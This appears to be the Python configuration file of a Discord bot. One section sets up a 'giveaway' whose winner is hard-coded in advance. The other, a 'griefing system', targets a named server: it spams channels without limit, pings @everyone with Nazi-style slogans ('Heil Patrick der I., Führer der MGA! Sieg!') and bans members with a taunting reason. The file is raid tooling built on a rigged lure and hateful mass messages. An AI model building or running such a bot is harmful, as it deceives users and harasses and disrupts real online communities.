class Settings:
    # GIVEAWAY SYSTEM
    # ---------------------------------------------------------------------------------------------------------------------

    COLOR = 0xa83232  # Embed Farbe

    GIVEAWAY_PRICE = '1x 1 Monat Discord Nitro'  # Preis vom Giveaway

    GIVEAWAY_WINNER = 901545137350533182  # Id vom Giveaway-Gewinner

    # Giveaway Zeit in Sekunden
    GIVEAWAY_TIME = 600 # 10 Minuten

    # GRIEFING SYSTEM:
    # ---------------------------------------------------------------------------------------------------------------------

    GRIEF_SERVER = 1029431306582491226  # Server Id von Kings Server

    TEST_SERVER = 1097869075708911717  # Server Id vom Test server

    CHANNEL_SPAM_NAME = 'heil-patrick'  # Name des Channels der Gespammt werden soll

    # Wie viel mal der Channel gespammt werden soll => Auf None setzen wenn unendlich viel
    CHANNEL_SPAM_AMOUNT = None

    # Welche Nachricht in jeden gespammten Channel geschickt werden soll
    CHANNEL_SPAM_MESSAGE = '@everyone Heil Patrick der I., Führer der MGA! Sieg!'

    SERVER_DEFAULT_CHANNELS = [
        1030181922057494579,  # Regeln Kanal
        1093240826756346028, # moderator-only
        1096752199289278564 # moderator-only
    ]

    TEST_SERVER_DEFAULT_CHANNELS = [
        1103770904233775216,  # Regeln Kanal
        1103770904233775217,  # moderator-only
    ]

    BAN_REASON='Griefed by MGA. Lang lebe Patrick der I.!'
